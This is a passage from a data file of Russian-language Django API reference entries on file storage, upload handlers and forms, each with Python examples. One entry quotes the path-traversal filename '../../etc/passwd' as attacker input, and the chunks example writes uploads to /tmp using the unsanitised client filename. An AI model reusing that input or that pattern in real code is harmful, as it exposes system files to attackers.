print(url)  # '/media/uploads/photo.jpg'

# В шаблоне Django:
# <img src="{{ profile.avatar.url }}" alt="Аватар">

# В представлении:
from myapp.models import UserProfile
profile = UserProfile.objects.get(pk=1)
print(profile.avatar.url)  # использует storage.url() внутри`,
  },
  {
    name: "FileSystemStorage.get_created_time(name)",
    category: "File handling",
    description:
      "Возвращает объект datetime с временем создания файла в локальной файловой системе. Если USE_TZ=True — возвращает aware datetime в UTC. Переопределяет базовый метод Storage.get_created_time() с реализацией через os.path.getctime().",
    syntax:
      "from django.core.files.storage import FileSystemStorage\n\nstorage = FileSystemStorage()\nstorage.get_created_time(name)",
    arguments: [
      {
        name: "name",
        description:
          "Имя файла — относительный путь внутри хранилища (от location).",
      },
    ],
    example: `from django.core.files.storage import FileSystemStorage

storage = FileSystemStorage(location='/media')

created = storage.get_created_time('uploads/photo.jpg')
print(created)
# datetime(2024, 3, 10, 8, 45, 0, tzinfo=UTC)

from django.utils import timezone
age = timezone.now() - created
print(f"Файл создан {age.days} дней назад")`,
  },
  {
    name: "InMemoryStorage.location",
    category: "File handling",
    description:
      "Атрибут хранилища InMemoryStorage. Всегда возвращает пустую строку, поскольку файлы хранятся в оперативной памяти и не имеют пути в файловой системе. Используется в тестах и временных операциях без записи на диск.",
    syntax:
      'from django.core.files.storage import InMemoryStorage\n\nstorage = InMemoryStorage()\nprint(storage.location)  # ""',
    arguments: [],
    example: `from django.core.files.storage import InMemoryStorage
from django.core.files.base import ContentFile

storage = InMemoryStorage()
print(repr(storage.location))  # ''

# Сохраняем файл в памяти
storage.save('test.txt', ContentFile(b"Hello"))
print(storage.listdir(''))  # ([''], ['test.txt'])`,
  },
  {
    name: "InMemoryStorage.base_url",
    category: "File handling",
    description:
      "Базовый URL для формирования ссылок на файлы в InMemoryStorage. По умолчанию равен None — вызов url() вернёт ошибку. Задаётся при создании экземпляра. Используется в тестах, где нужна проверка URL без реального хранилища.",
    syntax: 'InMemoryStorage(base_url="/files/")\nstorage.base_url',
    arguments: [],
    example: `from django.core.files.storage import InMemoryStorage
from django.core.files.base import ContentFile

storage = InMemoryStorage(base_url='/memory-files/')

storage.save('report.pdf', ContentFile(b"PDF data"))
print(storage.base_url)    # '/memory-files/'
print(storage.url('report.pdf'))  # '/memory-files/report.pdf'`,
  },
  {
    name: "InMemoryStorage.file_permissions_mode",
    category: "File handling",
    description:
      "Атрибут InMemoryStorage, определяющий режим доступа к файлу. Всегда возвращает None, поскольку файлы хранятся в памяти и не имеют разрешений файловой системы. Присутствует для соблюдения интерфейса базового класса Storage.",
    syntax: "storage.file_permissions_mode",
    arguments: [],
    example: `from django.core.files.storage import InMemoryStorage

storage = InMemoryStorage()
print(storage.file_permissions_mode)  # None

# В отличие от FileSystemStorage, где можно задать, например, 0o644`,
  },
  {
    name: "InMemoryStorage.directory_permissions_mode",
    category: "File handling",
    description:
      "Атрибут InMemoryStorage, определяющий режим доступа к директориям. Всегда возвращает None, так как директории в памяти не имеют разрешений файловой системы. Присутствует для соответствия интерфейсу базового класса Storage.",
    syntax: "storage.directory_permissions_mode",
    arguments: [],
    example: `from django.core.files.storage import InMemoryStorage

storage = InMemoryStorage()
print(storage.directory_permissions_mode)  # None

# В отличие от FileSystemStorage, где можно задать, например, 0o755`,
  },
  {
    name: "FileSystemStorage.location",
    category: "File handling",
    description:
      "Абсолютный путь к корневой директории хранилища в локальной файловой системе. По умолчанию равен значению настройки MEDIA_ROOT. Все операции с файлами выполняются относительно этого пути.",
    syntax:
      'from django.core.files.storage import FileSystemStorage\n\nstorage = FileSystemStorage(location="/var/media")\nprint(storage.location)',
    arguments: [],
    example: `from django.core.files.storage import FileSystemStorage

# Хранилище по умолчанию — использует MEDIA_ROOT
default_storage = FileSystemStorage()
print(default_storage.location)
# '/home/user/project/media'

# Кастомное хранилище с другим путём
custom_storage = FileSystemStorage(location='/var/uploads')
print(custom_storage.location)  # '/var/uploads'`,
  },
  {
    name: "FileSystemStorage.base_url",
    category: "File handling",
    description:
      "Базовый URL для формирования ссылок на файлы хранилища. По умолчанию равен настройке MEDIA_URL. Используется методом url() для построения полного URL к файлу.",
    syntax:
      'from django.core.files.storage import FileSystemStorage\n\nstorage = FileSystemStorage(base_url="/media/")\nprint(storage.base_url)',
    arguments: [],
    example: `from django.core.files.storage import FileSystemStorage

storage = FileSystemStorage(
    location='/var/uploads',
    base_url='/user-files/'
)

print(storage.base_url)             # '/user-files/'
print(storage.url('photo.jpg'))     # '/user-files/photo.jpg'`,
  },
  {
    name: "FileSystemStorage.file_permissions_mode",
    category: "File handling",
    description:
      "Режим доступа (chmod), устанавливаемый для файлов при их сохранении в хранилище. По умолчанию берётся из настройки FILE_UPLOAD_PERMISSIONS. Задаётся в восьмеричном формате (например, 0o644).",
    syntax:
      "FileSystemStorage(file_permissions_mode=0o644)\nstorage.file_permissions_mode",
    arguments: [],
    example: `from django.core.files.storage import FileSystemStorage

# Файлы будут доступны на чтение всем, на запись только владельцу
storage = FileSystemStorage(
    location='/var/uploads',
    file_permissions_mode=0o644
)

print(oct(storage.file_permissions_mode))  # '0o644'`,
  },
  {
    name: "FileSystemStorage.directory_permissions_mode",
    category: "File handling",
    description:
      "Режим доступа (chmod), устанавливаемый для директорий при их создании в хранилище. По умолчанию берётся из настройки FILE_UPLOAD_DIRECTORY_PERMISSIONS. Задаётся в восьмеричном формате (например, 0o755).",
    syntax:
      "FileSystemStorage(directory_permissions_mode=0o755)\nstorage.directory_permissions_mode",
    arguments: [],
    example: `from django.core.files.storage import FileSystemStorage

storage = FileSystemStorage(
    location='/var/uploads',
    directory_permissions_mode=0o755
)

print(oct(storage.directory_permissions_mode))  # '0o755'`,
  },
  {
    name: "FileSystemStorage.allow_overwrite",
    category: "File handling",
    description:
      "Булев атрибут, определяющий поведение при сохранении файла с уже существующим именем. Если False (по умолчанию) — вызывается get_available_name() для генерации уникального имени. Если True — существующий файл перезаписывается без изменения имени.",
    syntax: "FileSystemStorage(allow_overwrite=False)\nstorage.allow_overwrite",
    arguments: [],
    example: `from django.core.files.storage import FileSystemStorage
from django.core.files.base import ContentFile

# allow_overwrite=True — файл перезаписывается
storage = FileSystemStorage(
    location='/tmp/uploads',
    allow_overwrite=True
)

content = ContentFile(b"version 1", name="config.json")
storage.save('config.json', content)

content2 = ContentFile(b"version 2", name="config.json")
saved = storage.save('config.json', content2)
print(saved)  # 'config.json' — имя не изменилось`,
  },
  {
    name: "UploadedFile.read()",
    category: "File handling",
    description:
      "Читает и возвращает всё содержимое загруженного файла в виде байтов. Аналогичен методу read() стандартного файлового объекта Python. Для больших файлов рекомендуется использовать chunks() во избежание переполнения памяти.",
    syntax: "uploaded_file.read()",
    arguments: [],
    example: `def handle_upload(request):
    uploaded = request.FILES['document']

    # Для небольших файлов — читаем целиком
    if not uploaded.multiple_chunks():
        content = uploaded.read()
        print(f"Получено {len(content)} байт")
    else:
        # Для больших файлов — читаем по частям
        for chunk in uploaded.chunks():
            process(chunk)`,
  },
  {
    name: "UploadedFile.multiple_chunks(chunk_size=None)",
    category: "File handling",
    description:
      "Возвращает True, если загруженный файл достаточно велик, чтобы потребовать нескольких чанков при чтении. Используется для выбора стратегии обработки: read() для маленьких файлов и chunks() для больших.",
    syntax: "uploaded_file.multiple_chunks(chunk_size=None)",
    arguments: [
      {
        name: "chunk_size",
        description:
          "Размер чанка в байтах для сравнения с размером файла. По умолчанию 64 КБ.",
      },
    ],
    example: `def upload_view(request):
    f = request.FILES['file']

    if f.multiple_chunks():
        print(f"Файл большой ({f.size} байт) — читаем чанками")
        for chunk in f.chunks():
            save_chunk(chunk)
    else:
        print(f"Файл маленький — читаем целиком")
        data = f.read()`,
  },
  {
    name: "UploadedFile.chunks(chunk_size=None)",
    category: "File handling",
    description:
      "Генератор, последовательно читающий загруженный файл частями заданного размера. Позволяет эффективно обрабатывать большие файлы без загрузки всего содержимого в память. Используется при потоковой записи в хранилище.",
    syntax: "uploaded_file.chunks(chunk_size=None)",
    arguments: [
      {
        name: "chunk_size",
        description:
          "Размер одного чанка в байтах. По умолчанию 64 КБ (File.DEFAULT_CHUNK_SIZE).",
      },
    ],
    example: `import hashlib

def handle_large_upload(request):
    f = request.FILES['video']
    hasher = hashlib.md5()

    with open(f'/tmp/{f.name}', 'wb') as dest:
        for chunk in f.chunks(chunk_size=1024 * 1024):  # 1 МБ
            dest.write(chunk)
            hasher.update(chunk)

    print(f"MD5: {hasher.hexdigest()}")`,
  },
  {
    name: "UploadedFile.name",
    category: "File handling",
    description:
      "Атрибут, содержащий оригинальное имя загруженного файла, переданное браузером клиента. Не гарантирует безопасность — имя может содержать пути или специальные символы. Перед использованием рекомендуется обрабатывать через os.path.basename().",
    syntax: "uploaded_file.name",
    arguments: [],
    example: `import os

def upload_view(request):
    f = request.FILES['document']

    # Небезопасно использовать напрямую!
    print(f.name)  # например: '../../etc/passwd' от злоумышленника

    # Безопасное использование:
    safe_name = os.path.basename(f.name)
    print(safe_name)  # 'passwd'`,
  },
  {
    name: "UploadedFile.size",
    category: "File handling",
    description:
      "Атрибут, содержащий размер загруженного файла в байтах. Используется для валидации — проверки допустимого размера файла до его сохранения в хранилище.",
    syntax: "uploaded_file.size",
    arguments: [],
    example: `from django.core.exceptions import ValidationError

MAX_SIZE = 5 * 1024 * 1024  # 5 МБ

def upload_view(request):
    f = request.FILES['photo']

    if f.size > MAX_SIZE:
        raise ValidationError(
            f"Файл слишком большой: {f.size} байт. "
            f"Максимум {MAX_SIZE} байт."
        )

    print(f"Размер файла: {f.size} байт")`,
  },
  {
    name: "UploadedFile.content_type",
    category: "File handling",
    description:
      'Атрибут, содержащий MIME-тип загруженного файла, переданный браузером (например, "image/jpeg", "application/pdf"). Не является надёжной проверкой типа файла — браузер может указать любое значение. Для надёжной проверки используйте python-magic.',
    syntax: "uploaded_file.content_type",
    arguments: [],
    example: `def upload_view(request):
    f = request.FILES['file']

    print(f.content_type)
    # 'image/jpeg', 'application/pdf', 'text/plain' и т.д.

    # Базовая проверка (ненадёжна — доверять нельзя!)
    ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif']
    if f.content_type not in ALLOWED_TYPES:
        raise ValueError("Разрешены только изображения")`,
  },
  {
    name: "UploadedFile.content_type_extra",
    category: "File handling",
    description:
      'Словарь с дополнительными параметрами из заголовка Content-Type загруженного файла. Например, при Content-Type: text/plain; charset=utf-8 содержит {"charset": "utf-8"}. Обычно пустой для большинства загрузок.',
    syntax: "uploaded_file.content_type_extra",
    arguments: [],
    example: `def upload_view(request):
    f = request.FILES['document']

    print(f.content_type)
    # 'text/plain'

    print(f.content_type_extra)
    # {'charset': 'utf-8'}  — если передан charset в заголовке
    # {}  — если дополнительных параметров нет

    charset = f.content_type_extra.get('charset', 'utf-8')`,
  },
  {
    name: "UploadedFile.charset",
    category: "File handling",
    description:
      "Кодировка символов загруженного текстового файла, переданная браузером в заголовке Content-Type. Доступна только для текстовых файлов. Для бинарных файлов равна None. Используется при декодировании текстового содержимого файла.",
    syntax: "uploaded_file.charset",
    arguments: [],
    example: `def upload_text_file(request):
    f = request.FILES['textfile']

    print(f.charset)
    # 'utf-8' или 'windows-1251' или None

    # Декодирование с учётом переданной кодировки
    encoding = f.charset or 'utf-8'
    content = f.read().decode(encoding)
    print(content)`,
  },
  {
    name: "TemporaryUploadedFile.temporary_file_path()",
    category: "File handling",
    description:
      "Возвращает абсолютный путь к временному файлу на диске, в котором хранится загруженный файл. Доступен только для файлов, обработанных TemporaryFileUploadHandler (файлы крупнее FILE_UPLOAD_MAX_MEMORY_SIZE). Позволяет передавать файл другим процессам без копирования в память.",
    syntax: "uploaded_file.temporary_file_path()",
    arguments: [],
    example: `def handle_upload(request):
    f = request.FILES['video']

    # temporary_file_path() доступен только у TemporaryUploadedFile
    from django.core.files.uploadedfile import TemporaryUploadedFile

    if isinstance(f, TemporaryUploadedFile):
        tmp_path = f.temporary_file_path()
        print(f"Временный файл: {tmp_path}")
        # '/tmp/tmpXk93ls.upload'

        # Можно передать путь внешнему инструменту без загрузки в память
        import subprocess
        subprocess.run(['ffprobe', tmp_path])
    else:
        # Файл в памяти — InMemoryUploadedFile
        data = f.read()`,
  },
  {
    name: "InMemoryUploadedFile",
    category: "File handling",
    description:
      "Подкласс UploadedFile, хранящий загруженный файл целиком в оперативной памяти с помощью BytesIO. Используется для небольших файлов (меньше FILE_UPLOAD_MAX_MEMORY_SIZE, по умолчанию 2.5 МБ), обработанных MemoryFileUploadHandler. Быстрее TemporaryUploadedFile, но расходует RAM.",
    syntax:
      "from django.core.files.uploadedfile import InMemoryUploadedFile\n\nInMemoryUploadedFile(file, field_name, name, content_type, size, charset)",
    arguments: [
      {
        name: "file",
        description: "Объект BytesIO с содержимым файла в памяти.",
      },
      {
        name: "field_name",
        description: "Имя поля формы, из которого был загружен файл.",
      },
      { name: "name", description: "Оригинальное имя файла." },
      { name: "content_type", description: "MIME-тип файла." },
      { name: "size", description: "Размер файла в байтах." },
      {
        name: "charset",
        description: "Кодировка для текстовых файлов или None.",
      },
    ],
    example: `from django.core.files.uploadedfile import InMemoryUploadedFile
import io

# Создание InMemoryUploadedFile вручную (полезно в тестах)
content = b"Hello, world!"
file_obj = io.BytesIO(content)

uploaded = InMemoryUploadedFile(
    file=file_obj,
    field_name='document',
    name='hello.txt',
    content_type='text/plain',
    size=len(content),
    charset='utf-8'
)

print(uploaded.name)          # 'hello.txt'
print(uploaded.size)          # 13
print(uploaded.read())        # b'Hello, world!'`,
  },
  {
    name: "MemoryFileUploadHandler",
    category: "File handling",
    description:
      "Обработчик загрузки файлов, хранящий данные в оперативной памяти (BytesIO). Активируется по умолчанию для файлов, размер которых не превышает FILE_UPLOAD_MAX_MEMORY_SIZE (2.5 МБ). При превышении лимита передаёт обработку TemporaryFileUploadHandler.",
    syntax:
      "from django.core.files.uploadhandler import MemoryFileUploadHandler",
    arguments: [],
    example: `# Принудительное использование только MemoryFileUploadHandler
# в конкретном представлении (например, для тестов)
from django.core.files.uploadhandler import MemoryFileUploadHandler
from django.views.decorators.csrf import csrf_exempt

def memory_only_upload(request):
    request.upload_handlers = [MemoryFileUploadHandler()]
    f = request.FILES['file']
    print(type(f).__name__)  # 'InMemoryUploadedFile'
    return HttpResponse("OK")`,
  },
  {
    name: "TemporaryFileUploadHandler",
    category: "File handling",
    description:
      "Обработчик загрузки файлов, сохраняющий данные во временный файл на диске. Используется для крупных файлов, превышающих FILE_UPLOAD_MAX_MEMORY_SIZE. Временный файл автоматически удаляется после завершения обработки запроса.",
    syntax:
      "from django.core.files.uploadhandler import TemporaryFileUploadHandler",
    arguments: [],
    example: `from django.core.files.uploadhandler import TemporaryFileUploadHandler
from django.core.files.uploadedfile import TemporaryUploadedFile

# Принудительное сохранение всех загрузок во временные файлы
def large_file_upload(request):
    request.upload_handlers = [TemporaryFileUploadHandler()]
    f = request.FILES['video']

    print(type(f).__name__)  # 'TemporaryUploadedFile'
    print(f.temporary_file_path())  # '/tmp/tmpXyz123.upload'`,
  },
  {
    name: "FileUploadHandler.receive_data_chunk(raw_data, start)",
    category: "File handling",
    description:
      "Метод обработчика, вызываемый Django для каждого чанка данных в процессе загрузки файла. Должен возвращать данные чанка (или None, чтобы пропустить их). Переопределяется в собственных обработчиках для кастомной обработки потока загрузки.",
    syntax: "handler.receive_data_chunk(raw_data, start)",
    arguments: [
      {
        name: "raw_data",
        description: "Байты текущего чанка данных загружаемого файла.",
      },
      {
        name: "start",
        description:
          "Позиция (смещение в байтах) начала текущего чанка в общем потоке данных.",
      },
    ],
    example: `from django.core.files.uploadhandler import FileUploadHandler

class ProgressUploadHandler(FileUploadHandler):
    def receive_data_chunk(self, raw_data, start):
        # Отслеживаем прогресс загрузки
        received = start + len(raw_data)
        if self.content_length:
            pct = received / self.content_length * 100
            print(f"Загружено: {pct:.1f}%")

        # Обязательно возвращаем данные для дальнейшей обработки
        return raw_data`,
  },
  {
    name: "FileUploadHandler.file_complete(file_size)",
    category: "File handling",
    description:
      "Вызывается Django после получения всех данных файла. Должен вернуть объект UploadedFile (или его подкласс) либо None, если данный обработчик не обрабатывает этот файл. Именно здесь создаётся итоговый объект файла.",
    syntax: "handler.file_complete(file_size)",
    arguments: [
      {
        name: "file_size",
        description: "Итоговый размер загруженного файла в байтах.",
      },
    ],
    example: `from django.core.files.uploadhandler import FileUploadHandler
from django.core.files.uploadedfile import InMemoryUploadedFile
import io

class CustomUploadHandler(FileUploadHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.buffer = io.BytesIO()

    def receive_data_chunk(self, raw_data, start):
        self.buffer.write(raw_data)
        return raw_data

    def file_complete(self, file_size):
        self.buffer.seek(0)
        return InMemoryUploadedFile(
            self.buffer, self.field_name, self.file_name,
            self.content_type, file_size, self.charset
        )`,
  },
  {
    name: "FileUploadHandler.chunk_size",
    category: "File handling",
    description:
      "Атрибут, задающий размер чанка (в байтах), которым Django считывает загружаемый файл и передаёт в receive_data_chunk(). По умолчанию 65536 байт (64 КБ). Можно переопределить в кастомном обработчике для изменения гранулярности обработки.",
    syntax: "handler.chunk_size",
    arguments: [],
    example: `from django.core.files.uploadhandler import FileUploadHandler

class LargeChunkHandler(FileUploadHandler):
    # Читаем файл блоками по 1 МБ вместо 64 КБ по умолчанию
    chunk_size = 1024 * 1024  # 1 МБ

    def receive_data_chunk(self, raw_data, start):
        print(f"Получен чанк {len(raw_data)} байт")
        return raw_data

    def file_complete(self, file_size):
        return None  # делегируем следующему обработчику`,
  },
  {
    name: "FileUploadHandler.new_file(field_name, file_name, content_type, content_length, charset, content_type_extra)",
    category: "File handling",
    description:
      "Вызывается Django в начале загрузки каждого нового файла, до передачи каких-либо данных. Используется для инициализации ресурсов обработчика: открытия временных файлов, создания буферов и т. д. Может вызвать StopFutureHandlers для отмены последующих обработчиков.",
    syntax:
      "handler.new_file(field_name, file_name, content_type, content_length, charset, content_type_extra)",
    arguments: [
      {
        name: "field_name",
        description: "Имя поля формы HTML, из которого загружается файл.",
      },
      { name: "file_name", description: "Оригинальное имя файла от клиента." },
      {
        name: "content_type",
        description: "MIME-тип файла, переданный браузером.",
      },
      {
        name: "content_length",
        description: "Размер файла в байтах (может быть None если не указан).",
      },
      {
        name: "charset",
        description: "Кодировка для текстовых файлов или None.",
      },
      {
        name: "content_type_extra",
        description: "Словарь дополнительных параметров Content-Type.",
      },
    ],
    example: `from django.core.files.uploadhandler import FileUploadHandler
import io

class LoggingUploadHandler(FileUploadHandler):
    def new_file(self, field_name, file_name, content_type,
                 content_length, charset=None, content_type_extra=None):
        super().new_file(field_name, file_name, content_type,
                         content_length, charset, content_type_extra)
        print(f"Начало загрузки: {file_name}")
        print(f"Тип: {content_type}, Размер: {content_length} байт")
        self.buffer = io.BytesIO()

    def receive_data_chunk(self, raw_data, start):
        self.buffer.write(raw_data)
        return raw_data

    def file_complete(self, file_size):
        print(f"Загрузка завершена: {file_size} байт")
        return None`,
  },
  {
    name: "FileUploadHandler.upload_complete()",
    category: "File handling",
    description:
      "Вызывается Django после завершения загрузки всего запроса (всех файлов и полей формы). Используется для освобождения ресурсов, финальной обработки, отправки уведомлений или записи статистики. Вызывается для каждого обработчика в цепочке.",
    syntax: "handler.upload_complete()",
    arguments: [],
    example: `from django.core.files.uploadhandler import FileUploadHandler
import time

class TimedUploadHandler(FileUploadHandler):
    def new_file(self, *args, **kwargs):
        super().new_file(*args, **kwargs)
        self.start_time = time.time()

    def receive_data_chunk(self, raw_data, start):
        return raw_data

    def file_complete(self, file_size):
        return None

    def upload_complete(self):
        elapsed = time.time() - self.start_time
        print(f"Загрузка завершена за {elapsed:.2f} сек.")`,
  },
  {
    name: "FileUploadHandler.upload_interrupted()",
    category: "File handling",
    description:
      "Вызывается Django, если загрузка файла была прервана до завершения — например, при разрыве соединения с клиентом. Используется для очистки ресурсов: удаления частично записанных файлов, освобождения буферов, отката транзакций.",
    syntax: "handler.upload_interrupted()",
    arguments: [],
    example: `from django.core.files.uploadhandler import TemporaryFileUploadHandler
import os

class CleanupUploadHandler(TemporaryFileUploadHandler):
    def upload_interrupted(self):
        # Удаляем частично загруженный временный файл
        if hasattr(self, 'file') and self.file:
            tmp_path = self.file.name
            self.file.close()
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
                print(f"Временный файл удалён: {tmp_path}")
        super().upload_interrupted()`,
  },
  {
    name: "FileUploadHandler.handle_raw_input(input_data, META, content_length, boundary, encoding)",
    category: "File handling",
    description:
      "Позволяет обработчику полностью перехватить и обработать весь сырой HTTP-поток загрузки до его стандартного разбора. Если возвращает не None, Django использует возвращённое значение вместо стандартного разбора multipart. Используется для нестандартных форматов загрузки.",
    syntax:
      "handler.handle_raw_input(input_data, META, content_length, boundary, encoding=None)",
    arguments: [
      {
        name: "input_data",
        description:
          "Объект, подобный файлу, представляющий сырые данные HTTP-запроса.",
      },
      {
        name: "META",
        description: "Словарь request.META с заголовками HTTP-запроса.",
      },
      {
        name: "content_length",
        description: "Значение заголовка Content-Length в байтах.",
      },
      {
        name: "boundary",
        description: "MIME-граница для разделения частей multipart-запроса.",
      },
      { name: "encoding", description: "Кодировка запроса или None." },
    ],
    example: `from django.core.files.uploadhandler import FileUploadHandler

class PassthroughHandler(FileUploadHandler):
    def handle_raw_input(self, input_data, META, content_length,
                         boundary, encoding=None):
        # Возвращаем None — стандартный разбор не прерывается
        # Можно логировать метаданные запроса
        print(f"Загрузка: {content_length} байт, boundary={boundary}")
        return None  # None = продолжаем стандартную обработку

    def receive_data_chunk(self, raw_data, start):
        return raw_data

    def file_complete(self, file_size):
        return None`,
  },
  {
    name: "Form",
    category: "Forms",
    description:
      "Базовый класс для всех форм Django. Предоставляет механизм валидации данных, рендеринга HTML и доступа к очищенным данным. Каждая форма определяется как подкласс Form с набором полей. Может использоваться как связанная (с данными) или несвязанная (пустая) форма.",
    syntax:
      "from django import forms\n\nclass MyForm(forms.Form):\n    field = forms.CharField()",
    arguments: [],
    example: `from django import forms

class ContactForm(forms.Form):
    name = forms.CharField(max_length=100, label="Имя")
    email = forms.EmailField(label="Email")
    message = forms.CharField(widget=forms.Textarea, label="Сообщение")

# Несвязанная форма (пустая)
form = ContactForm()

# Связанная форма (с данными POST)
form = ContactForm(data=request.POST)
if form.is_valid():
    print(form.cleaned_data)`,
  },
  {
    name: "Form.__init__(data=None, files=None, auto_id='id_%s', prefix=None, initial=None, error_class=ErrorList, label_suffix=None, empty_permitted=False, field_order=None, use_required_attribute=None, renderer=None)",
    category: "Forms",
    description:
      "Конструктор класса Form. Принимает данные запроса для создания связанной формы или вызывается без аргументов для несвязанной. Позволяет настроить идентификаторы полей, начальные значения, префиксы для форм-наборов и другие параметры отображения.",
    syntax:
      "Form(data=None, files=None, auto_id='id_%s', prefix=None, initial=None, ...)",
    arguments: [
      {
        name: "data",
        description:
          "Словарь данных (обычно request.POST). Если передан — форма становится связанной.",
      },
      {
        name: "files",
        description:
          "Словарь файлов (обычно request.FILES). Нужен для форм с FileField/ImageField.",
      },
      {
        name: "auto_id",
        description:
          'Шаблон для генерации атрибутов id полей. По умолчанию "id_%s". Можно отключить, передав False.',
      },
      {
        name: "prefix",
        description:
          "Префикс для имён полей — позволяет использовать несколько форм на одной странице.",
      },
      {
        name: "initial",
        description: "Словарь начальных значений полей для несвязанной формы.",
      },
      {
        name: "error_class",
        description: "Класс для отображения ошибок. По умолчанию ErrorList.",
      },
      {
        name: "label_suffix",
        description: 'Строка, добавляемая после метки поля. По умолчанию ":".',
      },
      {
        name: "empty_permitted",
        description:
          "Разрешает отправку полностью пустой формы без ошибок. По умолчанию False.",
      },
      {
        name: "field_order",
        description:
          "Список имён полей для управления порядком их отображения.",
      },
      {
        name: "use_required_attribute",
        description:
          "Если True — добавляет атрибут required к обязательным полям HTML.",
      },
      {
        name: "renderer",
        description: "Пользовательский рендерер для генерации HTML формы.",
      },
    ],
    example: `from django import forms

class OrderForm(forms.Form):
    product = forms.CharField()
    quantity = forms.IntegerField()

# Несвязанная с начальными значениями
form = OrderForm(initial={'quantity': 1})

# Связанная — с данными POST и файлами
form = OrderForm(
    data=request.POST,
    files=request.FILES,
    prefix='order'  # поля будут называться order-product, order-quantity
)

# Две формы на одной странице через prefix
form_a = OrderForm(request.POST, prefix='a')
form_b = OrderForm(request.POST, prefix='b')`,
  },
  {
    name: "Form.is_bound",
    category: "Forms",
    description:
      "Булев атрибут, показывающий, является ли форма связанной (содержит данные) или несвязанной (пустая). Форма становится связанной, если в конструктор передан аргумент data. Несвязанная форма всегда невалидна — is_valid() возвращает False.",
    syntax: "form.is_bound",
    arguments: [],
    example: `from django import forms

class SearchForm(forms.Form):
    query = forms.CharField()

# Несвязанная форма
empty_form = SearchForm()
print(empty_form.is_bound)  # False

# Связанная форма
bound_form = SearchForm(data={'query': 'Django'})
print(bound_form.is_bound)  # True

# Форма с пустым словарём тоже связана!
bound_empty = SearchForm(data={})
print(bound_empty.is_bound)  # True`,
  },
  {
    name: "Form.data",
    category: "Forms",
    description:
      "Словарь с сырыми (необработанными) данными, переданными в форму. Содержит данные из request.POST или другого источника до какой-либо валидации или очистки. Для несвязанной формы — пустой словарь.",
    syntax: "form.data",
    arguments: [],
    example: `from django import forms

class LoginForm(forms.Form):
    username = forms.CharField()
    password = forms.CharField(widget=forms.PasswordInput)

form = LoginForm(data={'username': '  admin  ', 'password': 'secret'})

# Сырые данные — до очистки
print(form.data)
# {'username': '  admin  ', 'password': 'secret'}

form.is_valid()

# Очищенные данные — после валидации
print(form.cleaned_data)
# {'username': 'admin', 'password': 'secret'}`,
  },
  {
    name: "Form.files",
    category: "Forms",
    description:
      "Словарь загруженных файлов, переданных в форму (обычно request.FILES). Используется полями FileField и ImageField для получения загруженных файлов. Для форм без файловых полей не требуется.",
    syntax: "form.files",
    arguments: [],
    example: `from django import forms

class UploadForm(forms.Form):
    title = forms.CharField()
    document = forms.FileField()

form = UploadForm(
    data=request.POST,
    files=request.FILES
)

# Доступ к сырым данным файлов
print(form.files)
# {'document': <InMemoryUploadedFile: report.pdf>}

if form.is_valid():
    uploaded_file = form.cleaned_data['document']
    print(uploaded_file.name)`,
  },
  {
    name: "Form.errors",
    category: "Forms",
    description:
      'Словарь ошибок валидации формы. Ключи — имена полей (или "__all__" для ошибок всей формы), значения — списки сообщений об ошибках. Обращение к errors автоматически запускает full_clean(), если она ещё не выполнялась. Для несвязанной формы возвращает пустой словарь.',
    syntax: "form.errors",
    arguments: [],
    example: `from django import forms

class RegisterForm(forms.Form):
    username = forms.CharField(min_length=3)
    email = forms.EmailField()

form = RegisterForm(data={'username': 'ab', 'email': 'not-an-email'})

print(form.errors)
# {
#   'username': ['Убедитесь, что это значение содержит не менее 3 символов.'],
#   'email': ['Введите правильный адрес электронной почты.']
# }

print(form.errors.as_json())
# JSON-представление ошибок`,
  },
  {
    name: "Form.cleaned_data",
    category: "Forms",
    description:
      "Словарь с очищенными и валидированными данными формы. Доступен только после успешного вызова is_valid(). Значения приведены к нужным типам Python (например, строка даты → объект date). Содержит только поля, прошедшие валидацию.",
    syntax: "form.cleaned_data",
    arguments: [],
    example: `from django import forms
import datetime

class EventForm(forms.Form):
    title = forms.CharField(max_length=200)
    date = forms.DateField()
    seats = forms.IntegerField(min_value=1)

form = EventForm(data={
    'title': 'Конференция Django',
    'date': '2024-09-15',
    'seats': '150'
})

if form.is_valid():
    data = form.cleaned_data
    print(data['title'])   # 'Конференция Django'  (str)
    print(data['date'])    # datetime.date(2024, 9, 15)  (date!)
    print(data['seats'])   # 150  (int, не строка!)`,
  },
  {
    name: "Form.is_valid()",
    category: "Forms",
    description:
      "Запускает полную валидацию формы и возвращает True, если форма связана и все поля прошли проверку без ошибок. При первом вызове выполняет full_clean(), заполняя errors и cleaned_data. Несвязанная форма всегда возвращает False.",
    syntax: "form.is_valid()",
    arguments: [],
    example: `from django import forms

class ContactForm(forms.Form):
    name = forms.CharField()
    email = forms.EmailField()

def contact_view(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            # cleaned_data доступен только здесь
            name = form.cleaned_data['name']
            email = form.cleaned_data['email']
            send_email(name, email)
            return redirect('success')
    else:
        form = ContactForm()
    return render(request, 'contact.html', {'form': form})`,
  },
  {
    name: "Form.full_clean()",
    category: "Forms",
    description:
      "Выполняет полный цикл валидации формы: сначала вызывает clean() каждого поля, затем clean_<fieldname>() для каждого поля при наличии, затем clean() формы. Заполняет errors и cleaned_data. Вызывается автоматически из is_valid() — прямой вызов нужен редко.",
    syntax: "form.full_clean()",
    arguments: [],
    example: `from django import forms

class PriceForm(forms.Form):
    min_price = forms.DecimalField()
    max_price = forms.DecimalField()

    def clean(self):
        data = super().clean()
        min_p = data.get('min_price')
        max_p = data.get('max_price')
        if min_p and max_p and min_p > max_p:
            raise forms.ValidationError(
                "Минимальная цена не может быть больше максимальной."
            )
        return data

form = PriceForm(data={'min_price': '500', 'max_price': '100'})
form.full_clean()  # вызывается автоматически через is_valid()
print(form.errors['__all__'])`,
  },
  {
    name: "Form.clean()",
    category: "Forms",
    description:
      "Метод для валидации на уровне всей формы — вызывается после валидации каждого поля. Переопределяется для проверок, требующих нескольких полей сразу (например, совпадение паролей). Должен возвращать словарь cleaned_data. Ошибки добавляются через ValidationError.",
    syntax:
      "def clean(self):\n    data = super().clean()\n    # валидация\n    return data",
    arguments: [],
    example: `from django import forms

class PasswordChangeForm(forms.Form):
    password1 = forms.CharField(widget=forms.PasswordInput, label="Пароль")
    password2 = forms.CharField(widget=forms.PasswordInput, label="Подтверждение")

    def clean(self):
        data = super().clean()
        p1 = data.get('password1')
        p2 = data.get('password2')

        if p1 and p2 and p1 != p2:
